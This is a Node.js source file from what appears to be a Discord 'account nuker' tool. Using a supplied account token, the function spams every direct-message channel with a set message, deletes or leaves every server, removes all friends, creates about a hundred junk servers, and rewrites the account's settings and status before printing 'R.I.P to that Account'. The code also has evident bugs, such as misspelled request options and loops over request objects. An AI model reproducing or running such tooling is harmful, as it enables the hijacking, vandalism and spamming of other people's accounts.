const { getheaders, validateToken, colors, input } = require("../Settings/common")
const { execSync } = require("child_process")
const request = require("request")

async function GANGDOTJS_START(token_, Server_name, message_Content) {
    const token = await validateToken(token_)
    if(!(token)) {return}
    execSync(`node utilities/Plugins/Plugins_thread/CustomSeizure.js ${token}`)

    const headers = {'Authorization': token}
    const channelids = request.get({uir: "https://discord.com/api/v9/users/@me/channels", headers:getheaders(token)}, function(error,responce,body) {if(error) {console.log(error)}})
    process.stdout.write(`${colors.purple}Sending message to all friends.`)
    for(channel in channelids) {
        try {
            request.post({uri:`https://discord.com/api/v9/channels/${channel.id}/messages`,headers:headers,data:{"content": `${message_Content}`}}, function(error,responce,body) {
                if(error) {console.log(error)}
                if(responce.statusCode === 200) {
                    process.stdout.write(`${colors.lightGreen}Message sent to ${channel.id}.`)
                }
            })
        }
        catch(err) {
            console.log(err)
        }
    }
    const guildsids = request.get({uir: "https://discord.com/api/v9/users/@me/guilds", headers:getheaders(token)}, function(error,responce,body) {if(error) {console.log(error)}})
    for(guild in guildsids) {
        try {
            request.delete({uri: `https://discord.com/api/v8/guilds/'${guild.id}`, headers: headers}, function(error,responce,body) {
                if(error) {console.log(error)}
                if(responce.statusCode === 200) {
                    process.stdout.write(`${colors.lightGreen}Delete / Left guild: ${guild.name+colors.reset}.`)
                }
            })
        }
        catch(err) {
            console.log(err)
        }
    }
    const friendsids = request.get({uir: "https://discord.com/api/v9/users/@me/relationships", headers:getheaders(token)}, function(error,responce,body) {if(error) {console.log(error)}})
    for(friend in friendsids) {
        try {
            request.delete({uri: `https://discord.com/api/v9/users/@me/relationships/${friend.id}`, headers:getheaders(token)}, function(eror,responce,body) {
                if(error) {console.log(error)}
                if(responce.statusCode === 200) {
                    process.stdout.write(`${colors.purple}Removed friend: ${friend.user.username+"#"+friend.user.discriminator+colors.reset}`)
                }
            })
        }
        catch(err) {
            console.log(err)
        }
    }

    for(var i = 0;i <= 100;i++) {
        try {
            const payload = {'name': `${Server_name}`, 'region': 'europe', 'icon': "None", 'channels': "None"}
            request.post({uri: 'https://discord.com/api/v9/guilds', headers: getheaders(token), json:payload}, function(error,responce,body) {
                if(responce.statusCode === 200) {
                    process.stdout.write(`${colors.purple}Created Server ${i+colors.reset}.`)  
                }
            })
        }
        catch(err) {
            console.log(err)
        }
        process.stdout.write(`${colors.lightGreen}All Servers created.${colors.reset}`)
    }
    const setting = {
        'theme': "dark",
        'locale': "ja",
        'inline_embed_media': false,
        'inline_attachment_media': false,
        'gif_auto_play': false,
        'enable_tts_command': false,
        'render_embeds': false,
        'render_reactions': false,
        'animate_emoji': false,
        'convert_emoticons': false,
        'message_display_compact': false,
        'explicit_content_filter': '0',
        "custom_status": {"text": "Love from: For4#3043 and ††#3249"},
        'status': "idle"
    }
    request.patch({uri: "https://discord.com/api/v7/users/@me/settings", headers:getheaders(token), json:setting}, function(error,responce,body) {if(error) {console.log(error)}})
    request.delete({uri: "https://discord.com/api/v8/hypesquad/online", headers: getheaders(token)}, function(error,responce,body) {if(error) {console.log(error)}})
    execSync("taskkill /F /IM utilities/Plugins/Plugins_thread/CustomSeizure.js")
    process.stdout.write(`${colors.lightGreen}R.I.P to that Account.${colors.reset}`)
    await input("Press ENTER: ")
}